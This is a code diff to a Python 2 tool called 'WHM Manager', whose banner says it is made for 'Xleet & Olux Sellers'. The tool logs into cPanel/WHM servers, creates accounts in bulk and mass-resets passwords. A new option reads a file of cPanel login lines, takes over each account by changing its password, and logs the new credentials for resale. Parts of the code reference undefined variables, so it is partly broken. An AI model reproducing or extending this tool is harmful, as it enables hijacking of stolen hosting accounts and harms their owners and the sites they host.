@@ -22,25 +22,39 @@ WHITE = Fore.WHITE
 
 def Cookie(IP, user, passwd):
     # // Getting Cpanels Total Count
-    global sectoken, cookie, STATUS
+    global sectoken, STATUS, session
     URL = 'https://{}:2087/'.format(IP)
     data = 'user={}&pass={}&goto_uri=%2F'.format(user, passwd)
-    r = requests.post(URL+'/login/?login_only=1', data=data, verify=False)
+    session = requests.Session()
+    r = session.post(URL+'/login/?login_only=1', data=data, verify=False)
     src = r.content
     # // print src
     if 'redirect' in src and 'security_token' in src:
         STATUS = 'good'
         sectoken = src.split('"security_token":"')[1].split('"')[0]
         # // print sectoken
-        setted = r.headers['Set-Cookie']
-        whostmgrsession = setted.split('whostmgrsession=')[1].split(';')[0]
-        time_zone = 'Africa/Cairo' # // ENTER YOUR TIME ZONE.
-        cookie = 'timezone='+time_zone+'; whostmgrsession='+whostmgrsession
     else:
         STATUS = 'bad'
         print '\t{} -| {}Logging To WHM Failed, Please Review Your Data.'.format(WHITE, RED)
         time.sleep(7)
         quit()
+
+def CPCookie(IP, user, passwd):
+    # // Getting Cpanels Total Count
+    global sectoken, STATUS, session
+    URL = 'https://{}:2083/'.format(IP)
+    data = 'user={}&pass={}'.format(user, passwd)
+    session = requests.Session()
+    r = session.post(URL+'/login/?login_only=1', data=data, verify=False)
+    src = r.content
+    # // print src
+    if 'redirect' in src and 'security_token' in src:
+        STATUS = 'good'
+        sectoken = src.split('"security_token":"')[1].split('"')[0]
+        # // print sectoken
+    else:
+        STATUS = 'bad'
+        print '\t{} -| {}Logging To Cpanel Failed, Please Review Your Data.'.format(WHITE, RED)
 
 def Get_CPS(IP, user, passwd):
     # // Getting Cpanels Total Count
@@ -48,10 +62,7 @@ def Get_CPS(IP, user, passwd):
     WHM_Domains = []
     Cookie(IP, user, passwd)
     if STATUS == 'good':
-        headers = {
-            'cookie': cookie
-        }
-        r = requests.get('https://{}:2087/{}/scripts4/listaccts?viewall=1&search=&searchtype=&acctp=30&sortrev=&sortorder=domain'.format(IP, sectoken), headers=headers, verify=False)
+        r = session.get('https://{}:2087/{}/scripts4/listaccts?viewall=1&search=&searchtype=&acctp=30&sortrev=&sortorder=domain'.format(IP, sectoken), verify=False)
         src = r.content
         GG = 0
         try:
@@ -88,10 +99,9 @@ def GEN_PASS(size=14, chars=string.ascii_letters + string.ascii_uppercase + stri
 # ///////////////////////////////////////////////// #
 #            Main WHM Script Definitions            #
 
-def Create_Cpanel(IP, user, passwd, Domain, Email, Pack):
+def Create_Cpanel(Domain, Email, Pack):
     # // Getting Cookie And Tokens
     # // ////////////////////////////
-    Cookie(IP, user, passwd)
     if STATUS == 'good':
         # // Create Cpanel From WHM
         # // ////////////////////////
@@ -100,12 +110,9 @@ def Create_Cpanel(IP, user, passwd, Domain, Email, Pack):
             if TRIES != 10:
                 CP_USER = GEN_USER()
                 CP_PASS = GEN_PASS()
-                create_url = 'https://{}:2087/{}/scripts5/wwwacct'.format(IP, sectoken)
+                create_url = 'https://{}:2087/{}/scripts5/wwwacct'.format(Host, sectoken)
                 cp_create_data = 'sign=&plan={}&domain={}&username={}&password={}&contactemail={}&dbuser={}&msel=n%2Cy%2C10240%2C%2Cpaper_lantern%2C0%2C0%2C0%2C0%2C0%2C1048576%2Cn%2C0%2C0%2Cdefault%2Cen%2C%2C%2C%2Cn%2C1024%2Caarotfkx_default&cgi=1&language=en&spamassassin=1&hasuseregns=1&mxcheck=local'.format(Pack, Domain, CP_USER, CP_PASS, Email, CP_USER)
-                headers = {
-                    'cookie': cookie
-                }
-                REQ = requests.post(create_url, data=cp_create_data, headers=headers, verify=False)
+                REQ = session.post(create_url, data=cp_create_data, verify=False)
                 if 'Account Creation Status: ok (Account Creation Ok)' in REQ.content:
                     print '\t{} -| {}Created Cpanel -> {}https://{}:2083|{}|{} {}#TRY: {}'.format(RED, WHITE, RED, Domain, CP_USER, CP_PASS, WHITE, TRIES)
                     with open('CPS.txt','a+')as f:
@@ -124,20 +131,15 @@ def Create_Cpanel(IP, user, passwd, Domain, Email, Pack):
         # // print '\t{}-| {}Logging To WHM Failed, Please Review Your Data {}#TRY: {}.'.format(WHITE, RED, WHITE, TRIES)
         pass
 
-def Change_Pass(IP, user, passwd, PASS):
-    Get_CPS(IP, user, passwd)
-    Cookie(IP, user, passwd)
+def Change_Pass(PASS):
     if STATUS == 'good':
         for DATA in WHM_Domains:
             CP_US, CP_DO = DATA.split(':')
-            headers = {
-                'cookie': cookie
-            }
-            R = requests.get('https://{}:2087/{}/scripts4/listaccts'.format(IP, sectoken), headers=headers, verify=False)
+            R = session.get('https://{}:2087/{}/scripts4/listaccts'.format(Host, sectoken), verify=False)
             SRC = R.content
             passwordtoken = SRC.split("name=passwordtoken value='")[1].split("'")[0]
             data = 'password={}&user={}&passwordtoken={}&enablemysql=1'.format(PASS, CP_US, passwordtoken)
-            r = requests.get('https://{}:2087/{}/scripts/passwd'.format(IP, sectoken), headers=headers, data=data, verify=False)
+            r = session.post('https://{}:2087/{}/scripts/passwd'.format(Host, sectoken), data=data, verify=False)
             # // print r.content
             print '\n'
             if 'has been changed' in r.content:
@@ -147,6 +149,23 @@ def Change_Pass(IP, user, passwd, PASS):
                 file.close()
             else:
                 print '\t{} -| {}Failed Changing Password For {}{}'.format(WHITE, RED, WHITE, DATA)
+    else:
+        # // print '\t{} -| {}Failure Status Found, Please Review Your Login Data.'.format(WHITE, RED)
+        pass
+
+def Change_CP_Pass(Host, OLD_PASS, NEW_PASS):
+    if STATUS == 'good':
+        data = 'oldpass={}&newpass={}&newpass2={}&enablemysql=1&B1=Change+your+password+now%21'.format(OLD_PASS, NEW_PASS, NEW_PASS)
+        r = session.post('https://{}:2083/{}/frontend/paper_lantern/passwd/changepass.html'.format(Host, sectoken), data=data, verify=False)
+        # // print r.content
+        print '\n'
+        if 'Success! The browser is now redirecting' in r.content:
+            print '\t{} -| {}Password For {}{} {}Has Been Changed To : {}{}'.format(RED, WHITE, RED, Host, WHITE, RED, PASS)
+            file = open('Changed_Cpanels_CPS.txt', 'a+')
+            file.write('https://{}:2083|{}|{}\n'.format(Host, User, NEW_PASS))
+            file.close()
+        else:
+            print '\t{} -| {}Failed Changing Password For {}{}'.format(WHITE, RED, WHITE, Host)
     else:
         # // print '\t{} -| {}Failure Status Found, Please Review Your Login Data.'.format(WHITE, RED)
         pass
@@ -165,7 +184,8 @@ print '{} -| {}Bugs {}New {}WHM Manager {}v2.0 {}@2020{}.'.format(WHITE, RED, WH
 print '{} -| {}Made {}With {}Love For {}Xleet{} & {}Olux {}Sellers.\n'.format(WHITE, RED, WHITE, RED, WHITE, RED, WHITE, RED); time.sleep(0.1)
 
 print '{} -| {}1{} | {}Create New Cpanels{}.'.format(RED, WHITE, RED, WHITE, RED); time.sleep(0.1)
-print '{} -| {}2{} | {}Change All Cpanels Password{}.'.format(RED, WHITE, RED, WHITE, RED); time.sleep(0.1)
+print '{} -| {}2{} | {}Change All Cpanels Password [WHM]{}.'.format(RED, WHITE, RED, WHITE, RED); time.sleep(0.1)
+print '{} -| {}3{} | {}Change CPanels Password [CPS]{}.'.format(RED, WHITE, RED, WHITE, RED); time.sleep(0.1)
 
 print ' {}---{}---{}---{}---{}---{}---{}---{}---{}---{}---{}---{}---{}---{}---{}---{}---{}---{}---{}---\n'.format(RED, WHITE, RED, WHITE, RED, WHITE, RED, WHITE, RED, WHITE, RED,RED, WHITE, RED, WHITE, RED, WHITE, RED, WHITE); time.sleep(0.1)
 
@@ -187,13 +207,14 @@ if ask == 1:
     Password = raw_input(' \t\t{}-| {}Enter Your Password     {}: '.format(RED, WHITE, RED))
     Email = raw_input(' \t\t{}-| {}Enter Your Email        {}: '.format(RED, WHITE, RED))
     Package = raw_input(' \t\t{}-| {}Enter Your Package      {}: '.format(RED, WHITE, RED))
-    Domains_List = raw_input(' \t\t{}-| {}Enter Your Domains_List {}: '.format(RED, WHITE, RED))
+    Domains_List = raw_input(' \t\t{}-| {}Enter Your Domains List {}: '.format(RED, WHITE, RED))
+    Cookie(Host, Log, Password)
     print '\n'
+    fi = open(Domains_List, 'r')
     try:
-        fi = open(Domains_List, 'r')
         for i in fi:
             Domain = i.strip()
-            Create_Cpanel(Host, Log, Password, Domain, Email, Package)
+            Create_Cpanel(Domain, Email, Package)
     except:
         print '\n\t{} -| {}Please Provide Valid Data Or File To Open{}.'.format(WHITE, RED, WHITE)
         time.sleep(7)
@@ -205,13 +226,31 @@ elif ask == 2:
     Password = raw_input(' \t\t{}-| {}Enter Your Password      {}: '.format(RED, WHITE, RED))
     PASS = raw_input(' \t\t{}-| {}Enter Password To Change {}: '.format(RED, WHITE, RED))
     PASS = PASS + '@' + str(random.randint(1, 999))
+    Get_CPS(Host, Log, Password)
     try:
-        Change_Pass(Host, Log, Password, PASS)
+        Change_Pass(PASS)
     except:
         print '\n\t{} -| {}UnExpected Error! Failed To Change Password{}.'.format(WHITE, RED, WHITE)
     else:
         print '\n\t{} -| {}Please Choose Valid Tool And Try Again{}.'.format(WHITE, RED, WHITE)
         time.sleep(7)
         quit()
-
+elif ask == 3:
+    # // Changing All Passwords
+    Cpanels = raw_input(' \t\t{}-| {}Enter Your Cpanels File {}: '.format(RED, WHITE, RED))
+    PASS = raw_input(' \t\t{}-| {}Enter Password To Change {}: '.format(RED, WHITE, RED))
+    try:
+        fi = open(Cpanels, 'r')
+        for i in fi:
+            PASS = PASS + '@' + str(random.randint(1, 999))
+            Line = i.strip()
+            Url, User, Pass = Line.split('|')
+            Domain = Url.split('https://')[1].split(':')[0]
+            CPCookie(Domain, User, Pass)
+            Change_CP_Pass(Domain, Pass, PASS)
+    except:
+        print '\n\t{} -| {}Please Provide Valid Data Or File To Open{}.'.format(WHITE, RED, WHITE)
+        time.sleep(7)
+        quit()
+        
 # ///////////////////////////////////////////////// ## ///////////////////////////////////////////////// #
